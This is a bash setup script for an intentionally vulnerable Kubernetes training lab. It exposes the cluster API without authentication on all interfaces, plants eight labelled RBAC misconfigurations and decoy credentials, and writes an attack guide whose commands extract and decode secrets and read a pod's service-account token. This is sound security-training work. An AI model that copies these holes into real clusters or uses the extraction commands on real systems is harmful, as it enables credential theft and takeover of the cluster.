#!/bin/bash

# Simple Working Vulnerable K8s Lab - RBAC Focus
# Fixed: No infinite recursion

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

log_info() { echo -e "${BLUE}[*]${NC} $1"; }
log_success() { echo -e "${GREEN}[+]${NC} $1"; }
log_warning() { echo -e "${YELLOW}[!]${NC} $1"; }
log_error() { echo -e "${RED}[-]${NC} $1"; }

check_root() {
    if [[ $EUID -ne 0 ]]; then
        log_error "This script must be run as root"
        exit 1
    fi
}

cleanup() {
    log_info "Cleaning up..."
    
    systemctl stop k3s 2>/dev/null || true
    systemctl stop kubectl-proxy 2>/dev/null || true
    pkill -9 k3s 2>/dev/null || true
    pkill -9 kubectl 2>/dev/null || true
    
    if [ -f /usr/local/bin/k3s-uninstall.sh ]; then
        /usr/local/bin/k3s-uninstall.sh 2>/dev/null || true
    fi
    
    rm -rf /etc/rancher/k3s /var/lib/rancher/k3s ~/.kube
    rm -f /usr/local/bin/kubectl
    rm -f /etc/systemd/system/kubectl-proxy.service
}

install_k3s() {
    log_info "Installing k3s..."
    
    curl -sfL https://get.k3s.io | sh -
    
    export KUBECONFIG=/etc/rancher/k3s/k3s.yaml
    mkdir -p ~/.kube
    cp /etc/rancher/k3s/k3s.yaml ~/.kube/config
    chmod 644 ~/.kube/config
    
    log_info "Waiting for k3s to be ready..."
    for i in {1..30}; do
        if /usr/local/bin/k3s kubectl get nodes &>/dev/null; then
            log_success "k3s is ready!"
            return 0
        fi
        sleep 2
    done
    
    log_error "k3s failed to start"
    exit 1
}

expose_api_insecurely() {
    log_info "Exposing Kubernetes API without authentication..."
    
    # Create systemd service for unauthenticated proxy
    cat > /etc/systemd/system/kubectl-proxy.service << 'EOF'
[Unit]
Description=Kubectl Proxy (Unauthenticated API Access)
After=k3s.service
Requires=k3s.service

[Service]
Type=simple
User=root
Environment="KUBECONFIG=/etc/rancher/k3s/k3s.yaml"
ExecStart=/usr/local/bin/k3s kubectl proxy --address='0.0.0.0' --port=8080 --accept-hosts='.*' --disable-filter=true
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF
    
    systemctl daemon-reload
    systemctl enable kubectl-proxy.service
    systemctl start kubectl-proxy.service
    
    # Wait for proxy to start
    log_info "Waiting for proxy to start..."
    sleep 5
    
    # Verify it's working
    for i in {1..10}; do
        if curl -s http://localhost:8080/api/v1/namespaces &>/dev/null; then
            log_success "✓ Unauthenticated API accessible on port 8080"
            return 0
        fi
        sleep 2
    done
    
    log_warning "Port 8080 may take a moment to become available"
}

create_vulnerable_rbac() {
    log_info "Creating RBAC misconfigurations..."
    
    /usr/local/bin/k3s kubectl create namespace vuln 2>/dev/null || true
    /usr/local/bin/k3s kubectl create namespace prod 2>/dev/null || true
    
    cat <<EOF | /usr/local/bin/k3s kubectl apply -f -
---
# Vuln 1: Service account with cluster-admin
apiVersion: v1
kind: ServiceAccount
metadata:
  name: admin-sa
  namespace: vuln
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: admin-sa-cluster-admin
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
- kind: ServiceAccount
  name: admin-sa
  namespace: vuln
---
# Vuln 2: Default service accounts can read secrets everywhere
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: secret-reader
rules:
- apiGroups: [""]
  resources: ["secrets", "configmaps"]
  verbs: ["get", "list", "watch"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: everyone-reads-secrets
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: secret-reader
subjects:
- kind: ServiceAccount
  name: default
  namespace: default
- kind: ServiceAccount
  name: default
  namespace: vuln
- kind: ServiceAccount
  name: default
  namespace: prod
---
# Vuln 3: Can create pods/exec (privilege escalation vector)
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: pod-exec
rules:
- apiGroups: [""]
  resources: ["pods/exec", "pods/log"]
  verbs: ["create", "get"]
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get", "list"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: anyone-can-exec
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: pod-exec
subjects:
- kind: Group
  name: system:authenticated
  apiGroup: rbac.authorization.k8s.io
---
# Vuln 4: Can create/patch pods (container escape)
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: pod-creator
  namespace: vuln
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["create", "get", "list", "delete"]
- apiGroups: [""]
  resources: ["persistentvolumeclaims"]
  verbs: ["create", "get", "list"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: default-can-create-pods
  namespace: vuln
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: pod-creator
subjects:
- kind: ServiceAccount
  name: default
  namespace: vuln
---
# Vuln 5: Can impersonate service accounts
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: impersonator
rules:
- apiGroups: [""]
  resources: ["serviceaccounts"]
  verbs: ["impersonate"]
- apiGroups: [""]
  resources: ["users", "groups"]
  verbs: ["impersonate"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: vuln-impersonator
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: impersonator
subjects:
- kind: ServiceAccount
  name: default
  namespace: vuln
---
# Vuln 6: Can list/get nodes (info disclosure)
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: node-reader
rules:
- apiGroups: [""]
  resources: ["nodes"]
  verbs: ["get", "list"]
- apiGroups: [""]
  resources: ["nodes/proxy"]
  verbs: ["get"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: everyone-reads-nodes
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: node-reader
subjects:
- kind: Group
  name: system:authenticated
  apiGroup: rbac.authorization.k8s.io
---
# Vuln 7: Can create rolebindings (escalate own privileges)
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: rbac-manager
  namespace: vuln
rules:
- apiGroups: ["rbac.authorization.k8s.io"]
  resources: ["roles", "rolebindings"]
  verbs: ["create", "get", "list", "update", "patch"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: default-rbac-manager
  namespace: vuln
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: rbac-manager
subjects:
- kind: ServiceAccount
  name: default
  namespace: vuln
---
# Vuln 8: Wildcard permissions on core resources
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: wildcard-user
rules:
- apiGroups: [""]
  resources: ["*"]
  verbs: ["get", "list"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: prod-wildcard
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: wildcard-user
subjects:
- kind: ServiceAccount
  name: default
  namespace: prod
EOF
    
    log_success "8 different RBAC vulnerabilities created"
}

create_sensitive_data() {
    log_info "Creating secrets and configmaps..."
    
    # AWS credentials
    /usr/local/bin/k3s kubectl create secret generic aws-creds \
        --from-literal=access_key_id=AKIAIOSFODNN7EXAMPLE \
        --from-literal=secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY \
        --from-literal=region=us-east-1 \
        -n vuln 2>/dev/null || true
    
    # Database credentials
    /usr/local/bin/k3s kubectl create secret generic db-secret \
        --from-literal=username=postgres \
        --from-literal=password=P@ssw0rd123! \
        --from-literal=host=prod-db.internal.corp \
        --from-literal=port=5432 \
        -n vuln 2>/dev/null || true
    
    # API keys
    /usr/local/bin/k3s kubectl create secret generic api-keys \
        --from-literal=stripe_key=sk_live_51HqJxK2eZvKYlo2C8RzPaKLv \
        --from-literal=sendgrid_key=SG.nKx9w4bXRYuCq6cZMWLHkQ.9fK3jL2mN \
        -n vuln 2>/dev/null || true
    
    # Production secrets
    /usr/local/bin/k3s kubectl create secret generic prod-api \
        --from-literal=api_key=prod-key-987654321 \
        --from-literal=webhook_secret=whsec_prod123 \
        -n prod 2>/dev/null || true
    
    # Kube-system secret (high value target)
    /usr/local/bin/k3s kubectl create secret generic etcd-backup \
        --from-literal=backup_key=etcd-encryption-key-abc123 \
        -n kube-system 2>/dev/null || true
    
    # ConfigMap with sensitive info
    /usr/local/bin/k3s kubectl create configmap app-config \
        --from-literal=api_endpoint=https://internal-api.company.local/v1 \
        --from-literal=debug_enabled=true \
        --from-literal=admin_email=admin@company.com \
        --from-literal=internal_service=http://10.0.0.15:9000 \
        -n vuln 2>/dev/null || true
    
    log_success "Sensitive data created in multiple namespaces"
}

deploy_vulnerable_pod() {
    log_info "Deploying vulnerable pods..."
    
    cat <<EOF | /usr/local/bin/k3s kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: app
  namespace: vuln
spec:
  serviceAccountName: admin-sa
  containers:
  - name: nginx
    image: nginx:alpine
    ports:
    - containerPort: 80
    env:
    - name: HARDCODED_SECRET
      value: "my-secret-token-12345"
    - name: DB_PASSWORD
      valueFrom:
        secretKeyRef:
          name: db-secret
          key: password
---
apiVersion: v1
kind: Pod
metadata:
  name: web
  namespace: prod
spec:
  serviceAccountName: default
  containers:
  - name: nginx
    image: nginx:alpine
EOF
    
    /usr/local/bin/k3s kubectl wait --for=condition=ready pod/app -n vuln --timeout=60s 2>/dev/null || true
    /usr/local/bin/k3s kubectl wait --for=condition=ready pod/web -n prod --timeout=60s 2>/dev/null || true
    log_success "Vulnerable pods deployed"
}

create_guide() {
    cat > ./ATTACK_GUIDE.md << 'GUIDEOF'
# Kubernetes RBAC Attack Lab - Complete Guide

## 🎯 8 RBAC Vulnerabilities in This Lab

1. **Service account with cluster-admin** (admin-sa in vuln namespace)
2. **Default SAs can read all secrets** (across all namespaces)
3. **Anyone can exec into pods** (privilege escalation vector)
4. **Can create pods** (container escape potential)
5. **Can impersonate service accounts** (lateral movement)
6. **Everyone can read nodes** (info disclosure)
7. **Can create rolebindings** (self-privilege escalation)
8. **Wildcard permissions** (overly broad access)

---

## Port Information
- **Port 8080**: Unauthenticated API (use with `curl`)
- **Port 6443**: Authenticated API (use with `k3s kubectl`)

---

## Quick Start Tests

### Setup
```bash
export KUBECONFIG=/etc/rancher/k3s/k3s.yaml
alias kubectl='/usr/local/bin/k3s kubectl'
```

### Test 1: Unauthenticated API Access (Port 8080)

```bash
# No authentication required!
curl http://localhost:8080/api/v1/namespaces

# List ALL secrets without authentication
curl -s http://localhost:8080/api/v1/secrets | jq '.items[] | "\(.metadata.namespace)/\(.metadata.name)"'

# Extract specific secret
curl -s http://localhost:8080/api/v1/namespaces/vuln/secrets/db-secret | \
    jq -r '.data | to_entries[] | "\(.key): \(.value | @base64d)"'
```

---

## 🔴 RBAC Vulnerability Examples

Use `/usr/local/bin/k3s kubectl` for all kubectl commands in this lab.

### Example: Extract Database Password
```bash
/usr/local/bin/k3s kubectl get secret db-secret -n vuln -o jsonpath='{.data.password}' | base64 -d
echo
```

### Example: Steal Service Account Token
```bash
/usr/local/bin/k3s kubectl exec app -n vuln -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

---

## Troubleshooting

### Port 8080 not accessible?
```bash
systemctl status kubectl-proxy
journalctl -u kubectl-proxy -n 50
systemctl restart kubectl-proxy
curl http://localhost:8080/api/v1/namespaces
```

### kubectl not working?
```bash
# Always use the full path
/usr/local/bin/k3s kubectl get nodes

# Or create an alias
alias kubectl='/usr/local/bin/k3s kubectl'
```
GUIDEOF

    log_success "Attack guide created: ./ATTACK_GUIDE.md"
}

print_summary() {
    echo ""
    log_success "=== Lab Ready! ==="
    echo ""
    echo -e "${GREEN}✓ Port 8080: Unauthenticated API (working)${NC}"
    echo -e "${GREEN}✓ Port 6443: Authenticated API${NC}"
    echo ""
    echo -e "${YELLOW}IMPORTANT:${NC} Use full k3s kubectl path or create an alias:"
    echo ""
    echo -e "  ${BLUE}alias kubectl='/usr/local/bin/k3s kubectl'${NC}"
    echo ""
    echo -e "${GREEN}Quick Tests:${NC}"
    echo ""
    echo "  ${BLUE}# 1. Unauthenticated API:${NC}"
    echo "  curl http://localhost:8080/api/v1/namespaces"
    echo ""
    echo "  ${BLUE}# 2. Extract secret:${NC}"
    echo "  curl -s http://localhost:8080/api/v1/namespaces/vuln/secrets/db-secret | jq ."
    echo ""
    echo "  ${BLUE}# 3. With kubectl:${NC}"
    echo "  /usr/local/bin/k3s kubectl get secrets -n vuln"
    echo ""
    echo -e "${YELLOW}Full Guide:${NC} cat ./ATTACK_GUIDE.md"
    echo ""
    echo -e "${RED}⚠️  INTENTIONALLY VULNERABLE - DO NOT EXPOSE TO NETWORK!${NC}"
}

main() {
    echo -e "${RED}=== K8s RBAC Attack Lab ===${NC}"
    echo ""
    check_root
    cleanup
    install_k3s
    expose_api_insecurely
    create_vulnerable_rbac
    create_sensitive_data
    deploy_vulnerable_pod
    create_guide
    print_summary
}

main "$@"